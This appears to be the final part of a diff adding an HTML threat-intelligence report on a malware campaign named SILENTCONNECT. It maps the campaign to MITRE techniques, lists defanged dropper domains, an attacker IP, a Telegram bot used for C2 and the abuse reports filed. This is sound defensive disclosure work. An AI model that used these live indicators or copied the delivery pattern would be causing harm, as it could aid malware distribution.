+        <div class="mitre-card"><div class="mitre-id">T1027</div><div class="mitre-name">Obfuscated Files</div><div class="mitre-desc">Custom base64 cipher + MIME spoofing</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1553</div><div class="mitre-name">Subvert Trust Controls</div><div class="mitre-desc">Dropbox as delivery CDN</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1071.001</div><div class="mitre-name">Web Protocols C2</div><div class="mitre-desc">Telegram Bot API</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1102.002</div><div class="mitre-name">Bidirectional Web Svc</div><div class="mitre-desc">Telegram relays victim identity in real time</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1219</div><div class="mitre-name">Remote Access Software</div><div class="mitre-desc">ScreenConnect + LogMeIn dual-RMM</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1082</div><div class="mitre-name">System Info Discovery</div><div class="mitre-desc">ComputerName + UserName exfil</div></div>
+        <div class="mitre-card"><div class="mitre-id">T1567</div><div class="mitre-name">Exfil Over Web Service</div><div class="mitre-desc">Identity data via Telegram API</div></div>
+      </div>
+    </div>
+
+    <!-- CLUSTER -->
+    <div id="cluster" class="section">
+      <div class="page-header"><div class="page-title">SILENTCONNECT Cluster</div><div class="page-meta"><span>Four-node campaign - January to May 2026</span></div></div>
+      <div class="alert alert-yellow"><svg class="alert-icon" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg><div>Shared URL grammar <span class="text-mono">/Bin/*ClientSetup.msi?e=Access&y=Guest</span> documented by Elastic Security Labs and SOCPrime across all four nodes. <span class="text-mono">dgs.brimis.org</span> is the first node to add Telegram C2 and dual-RMM redundancy.</div></div>
+      <div class="card"><div class="card-title">Node Timeline</div><div class="tbl-wrap"><table><thead><tr><th>Domain</th><th>First Seen</th><th>SC Group</th><th>ASN</th><th>Notes</th></tr></thead><tbody>
+        <tr><td class="mono">tigecarllc[.]de</td><td class="mono">2026-01-02</td><td class="mono">c=cc</td><td>Cloudflare</td><td>Genesis node</td></tr>
+        <tr><td class="mono">newoneazu[.]com</td><td class="mono">2026-01-26</td><td class="mono">c=sim</td><td>Alsycon NL</td><td>CMD injection attempt</td></tr>
+        <tr><td class="mono">bumptobabeco[.]top</td><td class="mono">2026-03-29</td><td class="mono">y=Guest</td><td>Majestic Hosting VA</td><td>No group param</td></tr>
+        <tr><td class="mono text-red">dgs.brimis[.]org</td><td class="mono text-red">2026-05-08</td><td class="mono text-red">c=Misky</td><td>Cloudflare</td><td class="text-red">This case - Telegram C2 + dual-RMM added</td></tr>
+      </tbody></table></div></div>
+    </div>
+
+    <!-- INFRA -->
+    <div id="infra" class="section">
+      <div class="page-header"><div class="page-title">Infrastructure</div><div class="page-meta"><span>Attack origin, dropper host, ASN context</span></div></div>
+      <div class="two-col">
+        <div class="card"><div class="card-title">Attack Origin - Hyonix AS931</div><table><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Host</td><td class="mono">HY-52556</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">IP</td><td class="mono">207[.]189[.]26[.]195</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">ASN</td><td class="mono">AS931 Hyonix LLC</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Location</td><td class="mono">Dallas, TX</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">GreyNoise</td><td class="mono">noise=false, riot=false</td></tr></table></div>
+        <div class="card"><div class="card-title">Dropper Host - dgs.brimis.org</div><table><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Domain</td><td class="mono">dgs.brimis[.]org</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Registered</td><td class="mono">2026-05-08</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">Registrar</td><td class="mono">Namecheap</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">CDN</td><td class="mono">Cloudflare</td></tr><tr><td style="color:var(--muted);font-size:12px;padding:6px 8px">MSI Status</td><td class="text-red">HTTP 200 / 11.6 MB (live)</td></tr></table></div>
+      </div>
+    </div>
+
+    <!-- DISCLOSURE -->
+    <div id="disclosure" class="section">
+      <div class="page-header"><div class="page-title">Disclosure</div><div class="page-meta"><span>Abuse reports filed across all relevant platforms</span></div></div>
+      <div class="card"><div class="card-title">Abuse Reports</div><div class="tbl-wrap"><table><thead><tr><th>Platform</th><th>Subject</th></tr></thead><tbody>
+        <tr><td>Google</td><td>Gmail sender account + SMTP session ID</td></tr>
+        <tr><td>Telegram</td><td>@Damisky001bot - malware C2</td></tr>
+        <tr><td>Namecheap</td><td>brimis.org - malware hosting</td></tr>
+        <tr><td>Cloudflare</td><td>dgs.brimis.org - malware delivery</td></tr>
+        <tr><td>Hyonix (AS931)</td><td>207.189.26.195 - SMTP abuse origin</td></tr>
+        <tr><td>Dropbox</td><td>Business-Invitation.js - malware delivery</td></tr>
+        <tr><td>ConnectWise</td><td>dgs.brimis.org - unauthorized SC instance</td></tr>
+      </tbody></table></div></div>
+    </div>
+
+  </main>
+</div>
+<script>
+function show(id,el){document.querySelectorAll(".section").forEach(s=>s.classList.remove("active"));document.querySelectorAll(".nav-item").forEach(n=>n.classList.remove("active"));document.getElementById(id).classList.add("active");if(el)el.classList.add("active");}
+(function(){const t=document.querySelector("[data-theme-toggle]"),r=document.documentElement;let d="dark";r.setAttribute("data-theme",d);if(t)t.addEventListener("click",()=>{d=d==="dark"?"light":"dark";r.setAttribute("data-theme",d);t.innerHTML=d==="dark"?'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg>':'<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/></svg>';});})();
+</script>
+</body>
+</html>
